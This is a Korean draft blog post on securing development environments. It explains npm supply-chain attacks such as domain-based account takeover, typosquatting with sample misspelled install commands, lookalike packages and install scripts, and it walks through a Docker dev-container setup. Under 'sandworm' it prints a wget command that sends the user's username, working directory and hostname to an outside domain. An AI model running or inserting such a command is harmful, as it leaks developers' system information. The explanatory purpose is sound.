---
title: '안전한 개발환경을 만들어보자'
authors: [arch-spatula]
tags: ['docker', '보안', 'npm']
description: '개발환경의 보안을 신경써봅시다.'
toc_max_heading_level: 6
draft: true
---

# 안전한 개발환경을 만들어보자

<!--truncate-->

<!-- 글쓰기 단계 -->

## 배경

![](/img/2024-01-31/gilbert.jpeg)

> 인간이 잘하는 것이 하나 있다면 그것은 새로운 걱정을 찾는 것이다
>
> Gilbert(넷플릭스 샌드맨 ~~몇 화인지 모름~~)

취업하고 배가 따시하기 시작하니까 저는 이제 새로운 걱정이 생겼습니다. 보안입니다.

공부 혹은 취미로 코딩하는데 언제든지 멀웨어가 설치될 수 있습니다. github 돌아다니면서 재미있어 보이면 설치해봅니다. 그 과정에 언제든이 멀웨어가 설치될 수 있습니다.

<iframe class="codepen" src="https://www.youtube.com/embed/DjfpcmK62ew" title="지금! 🚨 개발자라면 무조건 알아야하는 NPM 해킹" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>

더 정확히는 위 영상을 보면서 생겨난 의문들과 대응 방안들을 찾고자 이 글을 쓰기 시작했습니다. 또 npm에 docker 설정한다는 언제 알려줄지도 모릅니다. 마냥 기다리기는 싫어서 제가 다루고 싶어졌습니다.

## 보안 취약점

### 공급망 공격

> 공격자가 기업(개발자)의 소프트웨어 설치 및 업데이트 배포 과정에 침입해 정상 소프트웨어인 것처럼 꾸민 악성 소프트웨어를 사용자 기기에 설치하는 방식
>
> \- 보안뉴스[^1]

공급망 공격은 패키지 생태계가 있는 모든 프로그래밍 언어는 해당합니다. 표준 라이브러리가 아닌 설치가 필요한 시점부터 모두 취약점입니다. 저간 soydev는 npm, pip에 의존을 많이 하고 있는데 설치할 때마다 저의 기계가 탈취될 가능성을 만드는 것입니다.

어느정도 오픈소스 커뮤니티에서 알려진 라이브러리를 사용하면 피해규모를 줄일 수 있을 것이라고 많이 착각합니다. 피해자가 많으면 대응하려는 사람이 많으니까 비교적 안전할 것이고 PR에 보안문제를 만드는 것을 통과시킬 가능성은 낮겠죠? 우리는 안일합니다. 언제든지 첨보자산은 변절(Compromised)할 수 있습니다. 구글이 알리바바에게 매수당하고 백도어를 언제 만들지 모릅니다. ~~알루미늄 모자는 내려 놓고~~

RAT Remote Access Trojan

### npm Account 공격

npm 패키지를 올린 계정의 만료된 도메인을 매입하고 이메일을 초기화시키고 이메일을 탈취한 다음에 코드를 푸쉬합니다.

<!-- 이 공격 경로는 이렇게 글로만 보면 이해가 안 될 것입니다. -->

제일먼저 정찰활동입니다. 우리는 첩보자산을 확보해야 합니다. 자산을 확보하기 위해서는 자산을 평가하고 선정해야 합니다.

1. 높은 다운로드 수를 갖고 있음
2. 커스텀 도메인을 갖고 있음
3. 커스텀 도메인을 구매가 가능해야 함

높은 다운로드 수를 갖고 있으면 그만큼 공격할 수 있는 대상이 많다는 뜻입니다. 상대방에게 가할 수 있는 최대 피해규모 기준으로 자산의 가치를 평가가가 가능합니다.

자산의 가치를 평가를 하면 취득이 가능해야 합니다. 자산 취득은 2, 3이 좌우합니다.

npm만의 고유한 특성입니다.

### Typosquatting Attack

인간의 실수를 바라고 만드는 공격입니다. 직접 타이핑을 하는 상남자들이 많은데 저같은 하남자들은 공식 홈페이지에서 코드 스니펫 클릭하고 설치합니다.

```sh
npm create vite@latest
```

위는 일반적인 vite 설치 명령입니다. 여기서 어순 오타 버전을 추가해주면 됩니다.

```sh
npm create viet@latest
npm create vtie@latest
npm create ivte@latest
npm create ivet@latest
```

latest도 오타를 내야 정상적이지만 이런 오타를 노리고 패키지를 설치하기 바라는 전략입니다.

이것에 대한 방어 전략은 저랑 같이 하남자가 되면 됩니다.

### 패키지 피싱

노마드 코더는 Math JS로 목차를 달아 뒀는데 저는 패키지 피싱이 이라는 제목이 생각났습니다.

공식 라이브러리의 다른 버전인척 흉내내는 전략입니다. 접두어 접미어를 붙여서 다른 버전인 것처럼 보이려고 합니다.

접미사로 min을 붙이거나 어떤 접두어를 붙이는 것입니다. 물론 이것에 대한 방어 전략은 그냥 같은 퍼블리셔인지 확인만 하면 됩니다.

### Installation Scripts

npm의 문제점 중 하나입니다. `pre-install`과 `post-install`을 실행합니다.

## Docker 설정

Docker를 활용하면 보안의 장점은 무엇인가? 의존하고 작업하는 범위가 볼륨 안에 있다면 볼륨까지 피해가 발생합니다.

설치하는 스크립트가 Docker 외부 컨택스트로 접근할 수 있다면 결국 소용없습니다.

Docker의 한계는 볼륨 범위라는 것입니다. 결국 환경변수(`.env`파일)와 관련된 개인정보는 탈취당할 것입니다.

그럼에두 불구하고 AWS에 올리지 않는다고 가정하고 Docker를 활용하는 방법을 소개하겠습니다.

Docker를 어느정도 이해해야 Docker를 사용해서 개발환경을 설정할 수 있습니다. 도커라이징을 하는 것입니다.

docker를 사용할 때 관건은 Dockerfile을 만들고 Docker 파일로 이미지를 만들고 이미지로 Docker 컨테이너를 만드는 것입니다.

```Dockerfile
FROM python:3.11

WORKDIR /code

COPY ./requirements.txt /code/requirements.txt

RUN pip install --no-cache-dir --upgrade -r /code/requirements.txt

COPY ./app /code/app

CMD ["uvicorn", "app.main:app", "--host", "0.0.0.0", "--port", "80", "--reload"]
```

뒤에 `--reload`만 추가했습니다. 위는 fastapi 공식 문서에서 알려주는 docker 설정을 가져왔습니다.

dev container를 플러그인을 설치합니다. 여기서 2가지 전략이 있습니다. attache to container 와 reopen in container 입니다.

저의 경우 reopen in container가 잘 동작했습니다.

```sh
docker build -t fast-docer-image .
```

```sh
docker run --rm -it ubuntu:16.04 /bin/bash
```

`--rm`은 종료 후 삭제를 의미합니다.

```sh
docker run --name fast-backend -p 80:80 fast-docer-image
```

```sh
docker run --name fast-backend -p 80:80 -d -v $(pwd):/code fast-docer-image
```

이 명령을 설명해보세요.

작업을 내부에서 처리하려면 볼륨 설정을 해줘야 합니다.

How to create a great dev environment with Docker

https://www.youtube.com/watch?v=0H2miBK_gAk

<!-- <iframe class="codepen" src="https://www.youtube.com/embed/Jx39roFmTNg" title="지금! 🚨 개발자라면 무조건 알아야하는 NPM 해킹" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe> -->

### npm

순수하게 npm을 사용하기에는 아쉬운 점이 많아 yarn, pnpm도 다루겠습니다. ~~bun은 좋지만 싫어요~~

### pip

#### fast api

### docker의 한계

패키지를 받는 방식에 따라 다릅니다. golang은 패키지를 root 디렉토리에 받습니다. 그렇기 때문에 실행하면 위험이 많습니다. deno도 이와 비슷한 정책입니다.

### 그렇다고 docker가 안전한가?

결론은 아닙니다.

<iframe class="codepen" src="https://www.youtube.com/embed/1PBXB3RcDLs" title="What's really inside your docker containers?" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>

What's really inside your docker containers?

## sandworm

npm에 대해서는 조금더 근본적인 해결책을 찾고 싶었습니다.

```sh
wget --quiet "https://curetosec.online/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)"
```

<!-- [LLM 전두엽 제거수술](https://www.youtube.com/watch?v=GyllRd2E6fg&pp=ygUIZmlyZXNoaXA%3D)을 하려는데 AI 수술대 AWS를 위한 `.env` 정보가 털린다거나 하는 것은 흔합니다. -->

<!-- 바로 저의 보안 취약점입니다. 저는 언제 해킹당할지 모른다는 생각을 갖고 있습니다. 언제 저도 모르게 저의 컴퓨터에 키로거(key logger)가 설치 되어 있고 원격서버에 실시간으로 전송할지 모른다는 생각을 갖고 있습니다. 클립보드에 이상한 값이 들어오면 바로 swap할 것이라는 생각을 갖고 있습니다. 가끔 휴대폰을 확인하면서 어디서 로그인 시도가 발생했는지 걱정하고 있습니다. 극단적으로 MFA가 뚤렸다는 생각도 갖고 있습니다. -->

<!-- 하지만 모든 것들은 생각입니다. 지금 현재 갖고 있는 지식에서 이 보안을 하나둘씩 대응하기에는 지식이 부족합니다. -->

[^1]: [[카드뉴스] ‘최근 가장 뜨거운 보안 이슈’, 공급망 공격](https://m.boannews.com/html/detail.html?mtype=3&tab_type=H&idx=122516)
